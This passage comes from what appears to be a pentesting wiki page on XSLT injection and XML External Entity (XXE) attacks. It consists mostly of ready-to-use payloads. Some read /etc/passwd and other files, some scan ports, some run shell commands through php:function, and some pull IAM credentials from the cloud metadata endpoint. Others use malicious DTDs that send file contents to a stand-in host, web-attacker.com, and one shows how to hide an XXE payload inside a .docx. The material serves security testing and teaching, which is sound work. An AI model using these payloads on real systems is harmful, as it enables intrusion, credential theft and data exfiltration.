Name:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:product-name')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:product-version')\n\"\n>\nProduct Version:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:product-version')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:is-schema-aware')\n\"\n>\nIs Schema Aware ?:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:is-schema-aware')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:supports-serialization')\n\"\n>\nSupports Serialization:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:supportsserialization')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:supports-backwards-compatibility')\n\"\n>\nSupports Backwards Compatibility:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:supportsbackwards-compatibility')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nSSRF\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://10.10.10.10/data/news.xml\n\"\nstylesheet\n=\n\"\nhttp://10.10.10.10//news_template.xsl\n\"\n>\n</\nesi:\ninclude\n>\nJavascript Injection\n<\nxsl:\nstylesheet\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nscript\n>\nconfirm\n(\n\"We're good\"\n);\n</\nscript\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nDirectory listing (PHP)\nOpendir + readdir\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('opendir','/path/to/dir')\n\"\n/>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('readdir')\n\"\n/>\n-\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nAssert (var_dump + scandir + false)\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\nhtml\nxsl:\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nbody\nstyle\n=\n\"\nfont-family\n:\nArial\n;\nfont-size\n:\n12pt\n;\nbackground-color\n:\n#EEEEEE\n\"\n>\n<\nxsl:\ncopy-of\nname\n=\n\"\nasd\n\"\nselect\n=\n\"\nphp:function('assert','var_dump(scandir(chr(46).chr(47)))==3')\n\"\n/>\n<\nbr\n/>\n</\nbody\n>\n</\nhtml\n>\nRead files\nInternal - PHP\n<\nxsl:\nstylesheet\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nabc\n=\n\"\nhttp://php.net/xsl\n\"\nversion\n=\n\"\n1.0\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nunparsed-text('/etc/passwd', ‚Äòutf-8')\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nInternal - XXE\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!\nDOCTYPE\ndtd_sample\n[\n<!ENTITY ext_file SYSTEM \"/etc/passwd\">\n]>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n&ext_file;\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nThrough HTTP\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\ndocument('/etc/passwd')\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\n<!\nDOCTYPE\nxsl:stylesheet\n[\n<!ENTITY passwd SYSTEM \"file:///etc/passwd\" >\n]>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n&passwd;\n</\nxsl:\ntemplate\n>\nInternal (PHP-function)\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('file_get_contents','/path/to/file')\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\nhtml\nxsl:\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nbody\nstyle\n=\n\"\nfont-family\n:\nArial\n;\nfont-size\n:\n12pt\n;\nbackground-color\n:\n#EEEEEE\n\"\n>\n<\nxsl:\ncopy-of\nname\n=\n\"\nasd\n\"\nselect\n=\n\"\nphp:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')\n\"\n/>\n<\nbr\n/>\n</\nbody\n>\n</\nhtml\n>\nPort scan\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\ndocument('http://example.com:22')\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nWrite to a file\nXSLT 2.0\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nresult-document\nhref\n=\n\"\nlocal_file.txt\n\"\n>\n<\nxsl:\ntext\n>\nWrite Local File\n</\nxsl:\ntext\n>\n</\nxsl:\nresult-document\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nXalan-J extension\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nredirect:\nopen\nfile\n=\n\"\nlocal_file.txt\n\"\n/>\n<\nredirect:\nwrite\nfile\n=\n\"\nlocal_file.txt\n\"\n/>\nWrite Local File\n</\nredirect:\nwrite\n>\n<\nredirect:\nclose\nfile\n=\n\"\nloxal_file.txt\n\"\n/>\n</\nxsl:\ntemplate\n>\nOther ways to write files in the PDF\nInclude external XSL\n<\nxsl:\ninclude\nhref\n=\n\"\nhttp://extenal.web/external.xsl\n\"\n/>\n<?xml version=\"1.0\" ?>\n<?xml-stylesheet type=\"text/xsl\" href=\"http://external.web/ext.xsl\"?>\nExecute code\nphp:function\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('shell_exec','sleep 10')\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\nhtml\nxsl:\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\n>\n<\nbody\nstyle\n=\n\"\nfont-family\n:\nArial\n;\nfont-size\n:\n12pt\n;\nbackground-color\n:\n#EEEEEE\n\"\n>\n<\nxsl:\ncopy-of\nname\n=\n\"\nasd\n\"\nselect\n=\n\"\nphp:function('assert','var_dump(scandir(chr(46).chr(47)));')\n\"\n/>\n<\nbr\n/>\n</\nbody\n>\n</\nhtml\n>\nExecute code using other frameworks in the PDF\nMore Languages\nIn this page you can find examples of RCE in other languajes:\nhttps://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#C%23%2FVB.NET%2FASP.NET\n(C#, Java, PHP)\nAccess PHP static functions from classes\nThe following function will call the static method\nstringToUrl\nof the class XSL:\n<!--- More complex test to call php class function-->\n<\nxsl:\nstylesheet\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nphp\n=\n\"\nhttp://php.net/xsl\n\"\nversion\n=\n\"\n1.0\n\"\n>\n<\nxsl:\noutput\nmethod\n=\n\"\nhtml\n\"\nversion\n=\n\"\nXHTML 1.0\n\"\nencoding\n=\n\"\nUTF-8\n\"\nindent\n=\n\"\nyes\n\"\n/>\n<\nxsl:\ntemplate\nmatch\n=\n\"\nroot\n\"\n>\n<\nhtml\n>\n<!-- We use the php suffix to call the static class function stringToUrl() -->\n<\nxsl:\nvalue-of\nselect\n=\n\"\nphp:function('XSL::stringToUrl','une_superstring-√†√î|modifier')\n\"\n/>\n<!-- Output: 'une_superstring ao modifier' -->\n</\nhtml\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\n(Example from\nhttp://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls\n)\nBrute-Force Detection List\nAuto_Wordlists/xslt.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nReferences\n‚Äã\nXSLT_SSRF\n\\\n‚Äã\nhttp://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf\n\\\n‚Äã\nhttp://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nXPATH injection\nNext\n- Pentesting Web\nXXE - XEE - XML External Entity\nLast modified\n16d ago"
    },
    {
        "title": "XXE - XEE - XML External Entity",
        "url": "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity",
        "text": "XXE - XEE - XML External Entity\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nAn XML External Entity attack is a type of attack against an application that parses XML input.\nXML Basics\nMost of this part was taken from this amazing Portswigger page:\nhttps://portswigger.net/web-security/xxe/xml-entities\n‚Äã\nWhat is XML?\nXML stands for \"extensible markup language\". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the \"X\" in \"AJAX\" stands for \"XML\"). But its popularity has now declined in favor of the JSON format.\nWhat are XML entities?\nXML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities\n&lt;\nand\n&gt;\nrepresent the characters\n<\nand\n>\n. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.\nWhat are XML elements?\nElement type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:\n<!ELEMENT stockCheck ANY>\nMeans that any object could be inside the parent\n<stockCheck></stockCheck>\n<!ELEMENT stockCheck EMPTY> Means that it should be empty\n<stockCheck></stockCheck>\n<!ELEMENT stockCheck (productId,storeId)> Declares that\n<stockCheck>\ncan have the children\n<productId>\nand\n<storeId>\nWhat is document type definition?\nThe XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional\nDOCTYPE\nelement at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an \"internal DTD\") or can be loaded from elsewhere (known as an \"external DTD\") or can be hybrid of the two.\nWhat are XML custom entities?\nXML allows custom entities to be defined within the DTD. For example:\n<!DOCTYPE foo [ <!ENTITY myentity \"my entity value\" > ]>\nThis definition means that any usage of the entity reference\n&myentity;\nwithin the XML document will be replaced with the defined value: \"\nmy entity value\n\".\nWhat are XML external entities?\nXML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.\nThe declaration of an external entity uses the\nSYSTEM\nkeyword and must specify a URL from which the value of the entity should be loaded. For example:\n<!DOCTYPE foo [ <!ENTITY ext SYSTEM \"http://normal-website.com\" > ]>\nThe URL can use the\nfile://\nprotocol, and so external entities can be loaded from file. For example:\n<!DOCTYPE foo [ <!ENTITY ext SYSTEM \"file:///path/to/file\" > ]>\nXML external entities provide the primary means by which\nXML external entity attacks\narise.\nWhat are XML Parameter entities?\nSometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:\n<!ENTITY % myparameterentity \"my parameter entity value\" >\nAnd second, parameter entities are referenced using the percent character instead of the usual ampersand:\n%myparameterentity;\nThis means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://f2g9j7hhkax.web-attacker.com\"> %xxe; ]>\nThis XXE payload declares an XML parameter entity called\nxxe\nand then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.\nMain attacks\n‚Äã\nMost of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe\n‚Äã\nNew Entity test\nIn this attack I'm going to test if a simple new ENTITY declaration is working\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<\n!ENTITY\ntoreplace\n\"3\"\n>\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n&toreplace;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck\n>\nRead file\nLets try to read\n/etc/passwd\nin different ways. For Windows you could try to read:\nC:\\windows\\system32\\drivers\\etc\\hosts\nIn this first case notice that SYSTEM \"\n**file:///**etc/passwd\n\" will also work.\n<!--?xml version=\"1.0\" ?-->\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY example SYSTEM \"/etc/passwd\">\n]>\n<\ndata\n>\n&example;\n</\ndata\n>\nThis second case should be useful to extract a file if the web server is using PHP (Not the case of Portswiggers labs)\n<!--?xml version=\"1.0\" ?-->\n<!\nDOCTYPE\nreplace\n[\n<!ENTITY example SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<\ndata\n>\n&example;\n</\ndata\n>\nIn this third case notice we are declaring the\nElement stockCheck\nas ANY\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\ndata\n[\n<\n!ELEMENT\nstockCheck\nANY\n>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n&file;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck3\n>\nDirectory listing\nIn\nJava\nbased applications it might be possible to\nlist the contents of a directory\nvia XXE with a payload like (just asking for the directory instead of the file):\n<!-- Root / -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\naa\n[\n<\n!ELEMENT\nbb\nANY\n>\n<!ENTITY xxe SYSTEM \"file:///\">\n]>\n<\nroot\n>\n<\nfoo\n>\n&xxe;\n</\nfoo\n>\n</\nroot\n>\n‚Äã\n<!-- /etc/ -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nroot\n[\n<!ENTITY xxe SYSTEM \"file:///etc/\" >\n]>\n<\nroot\n>\n<\nfoo\n>\n&xxe;\n</\nfoo\n>\n</\nroot\n>\nSSRF\nAn XXE could be used to abuse a SSRF inside a cloud\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\">\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n&xxe;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck\n>\nBlind SSRF\nUsing the\npreviously commented technique\nyou can make the server access a server you control to show it's vulnerable. But, if that's not working, maybe is because\nXML entities aren't allowed\n, in that case you could try using\nXML parameter entities\n:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\ntest\n[\n<!ENTITY % xxe SYSTEM \"http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net\"> %xxe;\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n3;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck\n>\n\"Blind\" SSRF - Exfiltrate data out-of-band\nIn this occasion we are going to make the server load a new DTD with a malicious payload that will send the content of a file via HTTP request (for multi-line files you could try to ex-filtrate it via\nftp://\n). This explanation as taken from\nPortswiggers lab here\n.\nAn example of a malicious DTD to exfiltrate the contents of the\n/etc/hostname\nfile is as follows:\n<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY\n&#x25;\nexfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>\">\n%eval;\n%exfiltrate;\nThis DTD carries out the following steps:\nDefines an XML parameter entity called\nfile\n, containing the contents of the\n/etc/passwd\nfile.\nDefines an XML parameter entity called\neval\n, containing a dynamic declaration of another XML parameter entity called\nexfiltrate\n. The\nexfiltrate\nentity will be evaluated by making an HTTP request to the attacker's web server containing the value of the\nfile\nentity within the URL query string.\nUses the\neval\nentity, which causes the dynamic declaration of the\nexfiltrate\nentity to be performed.\nUses the\nexfiltrate\nentity, so that its value is evaluated by requesting the specified URL.\nThe attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:\nhttp://web-attacker.com/malicious.dtd\nFinally, the attacker must submit the following XXE payload to the vulnerable application:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY % xxe SYSTEM \"http://web-attacker.com/malicious.dtd\"> %xxe;\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n3;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck\n>\nThis XXE payload declares an XML parameter entity called\nxxe\nand then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the\n/etc/passwd\nfile is transmitted to the attacker's server.\nError Based(External DTD)\nIn this case we are going to make the server loads a malicious DTD that will show the content of a file inside an error message (this is only valid if you can see error messages).\nExample from here.\n‚Äã\nYou can trigger an XML parsing error message containing the contents of the\n/etc/passwd\nfile using a malicious external DTD as follows:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY\n&#x25;\nerror SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;\nThis DTD carries out the following steps:\nDefines an XML parameter entity called\nfile\n, containing the contents of the\n/etc/passwd\nfile.\nDefines an XML parameter entity called\neval\n, containing a dynamic declaration of another XML parameter entity called\nerror\n. The\nerror\nentity will be evaluated by loading a nonexistent file whose name contains the value of the\nfile\nentity.\nUses the\neval\nentity, which causes the dynamic declaration of the\nerror\nentity to be performed.\nUses the\nerror\nentity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the\n/etc/passwd\nfile.\nInvoke the external DTD error with:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY % xxe SYSTEM \"http://web-attacker.com/malicious.dtd\"> %xxe;\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n3;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck\n>\nAnd you should see the contents of the file inside error message of the response of the web server.\nPlease notice that external DTD allows us to include one entity inside the second (\neval\n), but it is prohibited in the internal DTD. Therefore, you can't force an error without using an external DTD (usually).\nError Based (system DTD)\nSo what about blind XXE vulnerabilities when\nout-of-band interactions are blocked\n(external connections aren't available)?.\nInformation from here\n.\nIn this situation, it might still be possible to\ntrigger error messages containing sensitive data\n, due to a loophole in the XML language specification. If a document's\nDTD uses a hybrid of internal and external DTD\ndeclarations, then the\ninternal DTD can redefine entities that are declared in the external DTD\n. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.\nThis means that an attacker can employ the\nerror-based XXE technique from within an internal DTD\n, provided the XML parameter entity that they use is\nredefining an entity that is declared within an external DTD\n. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an\nexternal DTD file that is local to the application server\n.\nEssentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data.\nFor example, suppose there is a DTD file on the server filesystem at the location\n/usr/local/app/schema.dtd\n, and this DTD file defines an entity called\ncustom_entity\n. An attacker can trigger an XML parsing error message containing the contents of the\n/etc/passwd\nfile by submitting a hybrid DTD like the following:\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY % local_dtd SYSTEM \"file:///usr/local/app/schema.dtd\">\n<!ENTITY % custom_entity '\n<!ENTITY\n&#x25;\nfile SYSTEM \"file:///etc/passwd\">\n<!ENTITY\n&#x25;\neval \"<!ENTITY\n&#x26;\n#x25; error SYSTEM\n&#x27;\nfile:///nonexistent/\n&#x25;\nfile;\n&#x27;\n>\">\n&#x25;\neval;\n&#x25;\nerror;\n'>\n%local_dtd;\n]>\nThis DTD carries out the following steps:\nDefines an XML parameter entity called\nlocal_dtd\n, containing the contents of the external DTD file that exists on the server filesystem.\nRedefines the XML parameter entity called\ncustom_entity\n, which is already defined in the external DTD file. The entity is redefined as containing the\nerror-based XXE exploit\nthat was already described, for triggering an error message containing the contents of the\n/etc/passwd\nfile.\nUses the\nlocal_dtd\nentity, so that the external DTD is interpreted, including the redefined value of the\ncustom_entity\nentity. This results in the desired error message.\nReal world example:\nSystems using the GNOME desktop environment often have a DTD at\n/usr/share/yelp/dtd/docbookx.dtd\ncontaining an entity called\nISOamso\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamso '\n<!ENTITY\n&#x25;\nfile SYSTEM \"file:///etc/passwd\">\n<!ENTITY\n&#x25;\neval \"<!ENTITY\n&#x26;\n#x25; error SYSTEM\n&#x27;\nfile:///nonexistent/\n&#x25;\nfile;\n&#x27;\n>\">\n&#x25;\neval;\n&#x25;\nerror;\n'>\n%local_dtd;\n]>\n<\nstockCheck\n>\n<\nproductId\n>\n3;\n</\nproductId\n>\n<\nstoreId\n>\n1\n</\nstoreId\n>\n</\nstockCheck\n>\nAs this technique uses an\ninternal DTD you need to find a valid one first\n. You could do this\ninstalling\nthe same\nOS / Software\nthe server is using and\nsearching some default DTDs\n, or\ngrabbing a list\nof\ndefault DTDs\ninside systems and\ncheck\nif any of them exists:\n<!\nDOCTYPE\nfoo\n[\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n%local_dtd;\n]>\nFinding DTDs inside the system\nIn the following awesome github repo you can find\npaths of DTDs that can be present in the system\n:\ndtd-finder/list at master ¬∑ GoSecure/dtd-finder\nGitHub\nMoreover, if you have the\nDocker image of the victim system\n, you can use the tool of the same repo to\nscan\nthe\nimage\nand\nfind\nthe path of\nDTDs\npresent inside the system. Read the\nReadme of the github\nto learn how.\njava\n-jar\ndtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar\n‚Äã\nScanning TAR\nfile\n/tmp/dadocker.tar\n‚Äã\n[\n=\n]\nFound a DTD: /tomcat/lib/jsp-api.jar\n!\n/jakarta/servlet/jsp/resources/jspxml.dtd\nTesting\n0\nentities\n:\n[]\n‚Äã\n[\n=\n]\nFound a DTD: /tomcat/lib/servlet-api.jar\n!\n/jakarta/servlet/resources/XMLSchema.dtd\nTesting\n0\nentities\n:\n[]\nXXE via Office Open XML Parsers\n(Copied from\nhere\n)\nMany web applications allow you to upload Microsoft Office documents, and then they parse some details out of them. For example, you might have a web application that allows you to import data by uploading a spreadsheet in XLSX format. At some point, in order for the parser to extract the data from the Spreadsheet, the parser is going to need to\nparse at least one XML file\n.\nThe only way to test for this is to generate a\nMicrosoft Office file that contains an XXE payload\n, so let‚Äôs do that. First, create an empty directory to unzip your document to, and unzip it!\ntest$ ls\ntest.docx\ntest$ mkdir unzipped\ntest$ unzip ./test.docx -d ./unzipped/\nArchive:  ./test.docx\ninflating: ./unzipped/word/numbering.xml\ninflating: ./unzipped/word/settings.xml\ninflating: ./unzipped/word/fontTable.xml\ninflating: ./unzipped/word/styles.xml\ninflating: ./unzipped/word/document.xml\ninflating: ./unzipped/word/_rels/document.xml.rels\ninflating: ./unzipped/_rels/.rels\ninflating: ./unzipped/word/theme/theme1.xml\ninflating: ./unzipped/[Content_Types].xml\nOpen up\n./unzipped/word/document.xml\nin your favourite text editor (vim) and edit the\nXML to contain your favourite XXE payload\n. The first thing I try tends to be a HTTP request, like this:\n<!DOCTYPE x [ <!ENTITY test SYSTEM \"http://[ID].burpcollaborator.net/\"> ]>\n<x>&test;</x>\nThose lines should be inserted in between the two root XML objects, like this, and of course you will need to replace the URL with a URL that you can monitor for requests:\nThose lines should be inserted in between the two root XML objects, like thi\nAll that is left is to\nzip the file up to create your evil poc.docx file\n. From the ‚Äúunzipped‚Äù directory that we 